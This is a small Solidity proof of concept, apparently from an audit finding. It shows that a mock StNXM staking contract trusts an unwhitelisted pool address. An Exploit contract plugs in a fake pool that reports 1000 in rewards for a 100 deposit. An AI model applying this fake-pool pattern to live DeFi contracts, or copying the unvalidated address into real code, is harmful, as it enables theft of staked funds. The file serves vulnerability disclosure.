// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IStakingPool { function depositTo(uint256 amount) external returns(uint256); function withdraw(uint256 id) external returns(uint256); }
contract FakePool is IStakingPool { function depositTo(uint256) external pure returns(uint256){return 7;} function withdraw(uint256) external pure returns(uint256){return 1000;} }
contract StNXM { uint256 public wrapped=1000; address public pool; function stakeNxm(uint256 amount,address poolAddress) external { wrapped-=amount; pool=poolAddress; IStakingPool(poolAddress).depositTo(amount); } function getRewards() external returns(uint256){uint256 r=IStakingPool(pool).withdraw(7); wrapped+=r; return r;} }
contract Exploit { uint256 public reward; bool public harmed; event Proof(uint256 reward);
    function run() external { StNXM staker=new StNXM(); FakePool fake=new FakePool();
        // @> IStakingPool pool = IStakingPool(_poolAddress); _poolAddress is not whitelisted
        staker.stakeNxm(100,address(fake)); reward=staker.getRewards(); harmed=reward==1000; emit Proof(reward); require(harmed,"pool validated"); }
}
